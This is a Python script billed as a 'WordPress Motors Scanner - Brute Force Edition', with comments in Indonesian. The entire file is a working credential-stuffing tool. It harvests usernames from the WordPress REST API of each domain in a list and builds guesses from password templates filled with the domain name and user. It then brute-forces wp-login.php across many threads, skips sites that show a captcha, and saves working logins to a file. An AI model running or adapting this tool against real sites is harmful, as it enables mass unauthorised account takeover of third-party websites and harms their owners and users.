#!/usr/bin/env python3

import requests
import urllib3
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import re

# Disable SSL warnings untuk HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
    BLUE = '\033[94m'; CYAN = '\033[96m'; PURPLE = '\033[95m'
    RESET = '\033[0m'; BOLD = '\033[1m'

class MotorsScannerBruteForce:
    def __init__(self, password_file, verbose=False, max_workers=5):
        self.password_file = password_file
        self.verbose = verbose
        self.max_workers = max_workers
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()  # Lock terpisah untuk file operations
        self.passwords = []

        self.stats = {
            'total_domains': 0,
            'domains_https': 0,
            'domains_http': 0,
            'domains_failed': 0,
            'domains_with_users': 0,
            'login_attempts': 0,
            'login_success': 0,
            'captcha_blocked': 0,
            'false_positives': 0,
            'errors': 0,
            'brute_force_attempts': 0
        }

    def load_passwords(self):
        """Load password combinations from file"""
        try:
            with open(self.password_file, 'r', encoding='utf-8') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            self.log(f"Loaded {len(self.passwords)} password combinations", Colors.GREEN)
            return True
        except Exception as e:
            self.log(f"Error loading password file: {e}", Colors.RED, "ERROR")
            return False

    def log(self, message, color=Colors.RESET, level="INFO"):
        timestamp = time.strftime("%H:%M:%S")
        level_color = {
            "INFO": Colors.CYAN, "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW, "ERROR": Colors.RED,
            "VULN": Colors.PURPLE
        }.get(level, Colors.RESET)
        print(f"{Colors.BOLD}[{timestamp}]{Colors.RESET} {level_color}[{level}]{Colors.RESET} {color}{message}{Colors.RESET}")

    def safe_file_write(self, filename, content):
        """Thread-safe file writing"""
        with self.file_lock:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content)
                f.flush()  # Pastikan data langsung ditulis

    def detect_protocol(self, domain):
        """Detect protocol yang work untuk domain"""
        domain_clean = domain.replace('http://', '').replace('https://', '').split('/')[0]

        # Jika domain sudah specify protocol, gunakan itu
        if domain.startswith('https://'):
            return 'https', domain
        elif domain.startswith('http://'):
            return 'http', domain

        # Auto-detect protocol
        try:
            # Coba HTTPS dulu
            response = requests.get(f"https://{domain_clean}", timeout=5, verify=False)
            if response.status_code in [200, 301, 302, 403, 401]:
                return 'https', f"https://{domain_clean}"
        except:
            pass

        try:
            # Fallback ke HTTP
            response = requests.get(f"http://{domain_clean}", timeout=5, verify=False)
            if response.status_code in [200, 301, 302, 403, 401]:
                return 'http', f"http://{domain_clean}"
        except:
            pass

        return None, None

    def get_wpapi_users(self, base_url, protocol):
        """Get users dari WP API dengan protocol yang sesuai"""
        endpoints = [
            f"{base_url}/wp-json/wp/v2/users",
            f"{base_url}/?rest_route=/wp/v2/users"
        ]

        for endpoint in endpoints:
            try:
                verify_ssl = (protocol == 'https')
                response = requests.get(endpoint, timeout=8, verify=verify_ssl)

                if response.status_code == 200:
                    users = response.json()
                    valid_users = []

                    for user in users:
                        if isinstance(user, dict) and 'id' in user and 'slug' in user:
                            valid_users.append({
                                'id': user['id'],
                                'username': user['slug'],
                                'name': user.get('name', ''),
                                'url': user.get('url', '')
                            })

                    if valid_users:
                        self.log(f"Found {len(valid_users)} users via API", Colors.GREEN)
                        return valid_users

            except Exception as e:
                if self.verbose:
                    self.log(f"API Error: {e}", Colors.YELLOW, "WARNING")
                continue

        return []

    def extract_domain_info(self, base_url):
        """Extract domain information for password generation"""
        domain_clean = base_url.replace('http://', '').replace('https://', '').split('/')[0]

        # Extract domain parts
        domain_parts = domain_clean.split('.')
        domain_name = domain_parts[0] if len(domain_parts) > 1 else domain_parts[0]
        domain_center = '.'.join(domain_parts[-2:]) if len(domain_parts) >= 2 else domain_clean

        return {
            'domain': domain_clean,
            'domain_name': domain_name,
            'domain_center': domain_center,
            'company': domain_name,  # Assume domain name as company
            'department': 'IT',      # Default values
            'location': 'ID',
            'role': 'admin',
            'year': '2025',
            'user': 'admin'  # Default user for template
        }

    def generate_passwords(self, domain_info, username):
        """Generate passwords based on templates and user info"""
        generated = []

        for template in self.passwords:
            password = template

            # Replace placeholders
            password = password.replace('%user%', username)
            password = password.replace('%domain%', domain_info['domain'])
            password = password.replace('%domain_name%', domain_info['domain_name'])
            password = password.replace('%domain_center%', domain_info['domain_center'])
            password = password.replace('%company%', domain_info['company'])
            password = password.replace('%department%', domain_info['department'])
            password = password.replace('%location%', domain_info['location'])
            password = password.replace('%role%', domain_info['role'])
            password = password.replace('%year%', domain_info['year'])

            generated.append(password)

        return generated

    def detect_captcha(self, text):
        """Detect captcha presence"""
        captcha_indicators = [
            'captcha', 'recaptcha', 'hcaptcha', 'cloudflare',
            'challenge', 'security check', 'verify you are human'
        ]
        text_lower = text.lower()
        return any(indicator in text_lower for indicator in captcha_indicators)

    def attempt_login(self, base_url, protocol, username, password):
        """Attempt login dengan protocol support"""
        try:
            session = requests.Session()
            login_url = f"{base_url}/wp-login.php"

            verify_ssl = (protocol == 'https')

            # Get login page
            login_page = session.get(login_url, timeout=5, verify=verify_ssl)

            # Check captcha
            if self.detect_captcha(login_page.text):
                return "CAPTCHA_BLOCKED"

            # Attempt login
            login_data = {
                'log': username, 'pwd': password,
                'wp-submit': 'Log In', 'testcookie': '1'
            }

            response = session.post(login_url, data=login_data, timeout=10,
                                  verify=verify_ssl, allow_redirects=True)

            # Check captcha di response
            if self.detect_captcha(response.text):
                return "CAPTCHA_BLOCKED"

            # Check login success
            checks = [
                'wp-admin' in response.url,
                'dashboard' in response.url,
                'Log Out' in response.text,
                'Howdy' in response.text,
                'wp-admin-bar' in response.text
            ]

            return "VERIFIED" if sum(checks) >= 2 else "LOGIN_FAILED"

        except Exception as e:
            return f"ERROR: {str(e)}"

    def brute_force_user(self, base_url, protocol, user_info):
        """Brute force password untuk user tertentu"""
        username = user_info['username']
        domain_info = self.extract_domain_info(base_url)

        # Generate passwords untuk user ini
        passwords_to_try = self.generate_passwords(domain_info, username)

        self.log(f"Trying {len(passwords_to_try)} passwords for {username}", Colors.BLUE)

        for password in passwords_to_try:
            with self.lock:
                self.stats['brute_force_attempts'] += 1
                self.stats['login_attempts'] += 1

            if self.verbose:
                self.log(f"Trying: {username}:{password}", Colors.YELLOW)

            result = self.attempt_login(base_url, protocol, username, password)

            if result == "VERIFIED":
                with self.lock:
                    self.stats['login_success'] += 1

                self.log(f"✅ SUCCESS: {username}:{password} @ {base_url}", Colors.GREEN, "SUCCESS")
                return {
                    'status': 'VERIFIED',
                    'username': username,
                    'password': password,
                    'base_url': base_url,
                    'protocol': protocol
                }

            elif result == "CAPTCHA_BLOCKED":
                with self.lock:
                    self.stats['captcha_blocked'] += 1
                self.log(f"🛡️ CAPTCHA: {username} @ {base_url}", Colors.YELLOW, "WARNING")
                return {
                    'status': 'CAPTCHA_BLOCKED',
                    'username': username,
                    'base_url': base_url,
                    'protocol': protocol
                }

        return None

    def process_domain(self, domain):
        """Process domain dengan auto-protocol detection dan brute force"""
        original_domain = domain

        try:
            # Detect protocol yang work
            protocol, base_url = self.detect_protocol(domain)

            if not protocol:
                self.log(f"❌ No working protocol for {original_domain}", Colors.RED, "ERROR")
                with self.lock:
                    self.stats['domains_failed'] += 1
                return []

            # Update stats berdasarkan protocol
            with self.lock:
                if protocol == 'https':
                    self.stats['domains_https'] += 1
                else:
                    self.stats['domains_http'] += 1

            self.log(f"Using {protocol.upper()} for {original_domain} -> {base_url}", Colors.CYAN)

            # Get users dari WP API
            users = self.get_wpapi_users(base_url, protocol)

            # Jika tidak ada user ditemukan, coba dengan username 'admin'
            if not users:
                self.log(f"No users found via API, trying 'admin'", Colors.YELLOW, "WARNING")
                users = [{'username': 'admin', 'id': 1, 'name': 'Administrator'}]

            with self.lock:
                self.stats['domains_with_users'] += 1

            results = []

            # Coba setiap user
            for user in users:
                self.log(f"Brute forcing {user['username']}", Colors.BLUE)
                result = self.brute_force_user(base_url, protocol, user)
                if result:
                    results.append(result)
                    # Jika berhasil untuk satu user, lanjut ke domain berikutnya
                    break

            return results

        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
            self.log(f"Domain error: {e}", Colors.RED, "ERROR")
            return []

    def run_scan(self, domains_file, output_file):
        """Main scan function"""
        # Load password combinations first
        if not self.load_passwords():
            return

        try:
            with open(domains_file, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.log(f"File {domains_file} not found!", Colors.RED, "ERROR")
            return

        self.stats['total_domains'] = len(domains)

        self.log(f"Starting brute force scan of {len(domains)} domains", Colors.CYAN)
        self.log(f"Password combinations: {len(self.passwords)}", Colors.CYAN)
        self.log(f"Threads: {self.max_workers}", Colors.CYAN)
        self.log(f"Output: {output_file}", Colors.CYAN)
        print()

        # Clear output files dengan thread-safe
        with self.file_lock:
            open(output_file, 'w').close()
            open('captcha_blocked.txt', 'w').close()
            open('all_results.txt', 'w').close()

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_domain = {
                executor.submit(self.process_domain, domain): domain
                for domain in domains
            }

            completed = 0
            for future in as_completed(future_to_domain):
                domain = future_to_domain[future]
                completed += 1

                try:
                    results = future.result(timeout=120)
                    if results:
                        for result in results:
                            if result['status'] == 'VERIFIED':
                                line = f"{result['base_url']}|{result['username']}|{result['password']}\n"
                                self.safe_file_write(output_file, line)
                            elif result['status'] == 'CAPTCHA_BLOCKED':
                                line = f"{result['base_url']}|{result['username']}|CAPTCHA_BLOCKED\n"
                                self.safe_file_write('captcha_blocked.txt', line)

                            # Save to all results
                            all_line = f"{result['status']}|{result['protocol']}|{result['base_url']}|{result['username']}|{result.get('password', 'N/A')}\n"
                            self.safe_file_write('all_results.txt', all_line)

                    # Progress update
                    progress = (completed / len(domains)) * 100
                    self.log(f"Progress: {completed}/{len(domains)} ({progress:.1f}%) - "
                           f"HTTPS:{self.stats['domains_https']} HTTP:{self.stats['domains_http']} - "
                           f"Success:{self.stats['login_success']} - "
                           f"Attempts:{self.stats['brute_force_attempts']}", Colors.CYAN, "INFO")

                except Exception as e:
                    self.log(f"Thread error: {e}", Colors.RED, "ERROR")
                    with self.lock:
                        self.stats['errors'] += 1

        elapsed = time.time() - start_time
        self.print_summary(elapsed)

    def print_summary(self, elapsed_time):
        """Print comprehensive summary"""
        print()
        self.log("=" * 60, Colors.CYAN)
        self.log("BRUTE FORCE SCAN SUMMARY", Colors.CYAN, "INFO")
        self.log("=" * 60, Colors.CYAN)
        self.log(f"Total Domains       : {self.stats['total_domains']}", Colors.RESET)
        self.log(f"✅ HTTPS Working     : {self.stats['domains_https']}", Colors.GREEN)
        self.log(f"🌐 HTTP Working      : {self.stats['domains_http']}", Colors.BLUE)
        self.log(f"❌ No Protocol       : {self.stats['domains_failed']}", Colors.RED)
        self.log(f"Domains with Users  : {self.stats['domains_with_users']}", Colors.CYAN)
        self.log(f"Brute Force Attempts: {self.stats['brute_force_attempts']}", Colors.CYAN)
        self.log(f"Login Attempts      : {self.stats['login_attempts']}", Colors.CYAN)
        self.log(f"✅ Successful Logins : {self.stats['login_success']}", Colors.GREEN)
        self.log(f"🛡️ Captcha Blocked   : {self.stats['captcha_blocked']}", Colors.YELLOW)
        self.log(f"Errors              : {self.stats['errors']}", Colors.RED)
        self.log(f"Threads Used        : {self.max_workers}", Colors.CYAN)
        self.log(f"Time Elapsed        : {elapsed_time:.2f}s", Colors.RESET)

        # Calculate performance metrics
        if elapsed_time > 0:
            rps = self.stats['brute_force_attempts'] / elapsed_time
            self.log(f"Requests/Second     : {rps:.2f}", Colors.CYAN)

        self.log("=" * 60, Colors.CYAN)

def main():
    parser = argparse.ArgumentParser(description="WordPress Motors Scanner - Brute Force Edition (Thread-Safe)")
    parser.add_argument("-l", "--list", required=True, help="Domains list file")
    parser.add_argument("-o", "--output", default="success.txt", help="Output file for successful logins")
    parser.add_argument("-p", "--passwords", required=True, help="Password combinations file")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads/workers (default: 5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")

    args = parser.parse_args()

    # Validate threads parameter
    if args.threads < 1:
        args.threads = 1
    elif args.threads > 50:
        print(f"{Colors.YELLOW}Warning: Threads limited to 50 for stability{Colors.RESET}")
        args.threads = 50

    scanner = MotorsScannerBruteForce(args.passwords, args.verbose, args.threads)
    scanner.run_scan(args.list, args.output)

if __name__ == "__main__":
    main()
